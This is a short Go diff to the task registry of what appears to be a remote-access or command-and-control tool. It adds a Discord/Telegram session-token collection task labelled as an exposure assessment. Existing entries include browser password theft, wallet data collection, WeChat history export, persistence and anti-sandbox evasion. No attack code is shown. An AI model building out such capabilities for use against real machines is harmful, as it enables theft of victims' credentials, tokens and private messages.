@@ -175,6 +175,7 @@ func init() {
 			Parameters: []TaskParam{{Name: "command", Type: "string", Required: true, Description: "Persistence ID"}}},
 		{Type: TaskTypeBrowserSteal, Name: "Browser Steal", Description: "Steal browser passwords", Category: "credential-access"},
 		{Type: TaskTypeWalletCollect, Name: "Wallet Collect", Description: "Enumerate wallet client/extension data directories (bounded metadata + small text previews, no key decryption)", Category: "credential-access"},
+		{Type: TaskTypeMessagingToken, Name: "Messaging Token Collect", Description: "Exposure assessment of Discord/Telegram session stores: presence + count + redacted token previews only (no full tokens, no API enrichment)", Category: "credential-access"},
 		{Type: TaskTypeSandboxNoise, Name: "Sandbox Noise", Description: "Bounded, opt-in CPU/temp-file churn to add anti-sandbox noise (max 10s/4 workers)", Category: "defense-evasion",
 			Parameters: []TaskParam{{Name: "command", Type: "string", Required: false, Default: "2:2", Description: "<seconds>:<workers>, clamped to 10s/4"}}},
 		{Type: TaskTypeWeChatHistory, Name: "WeChat History", Description: "Export WeChat chat history", Category: "collection"},
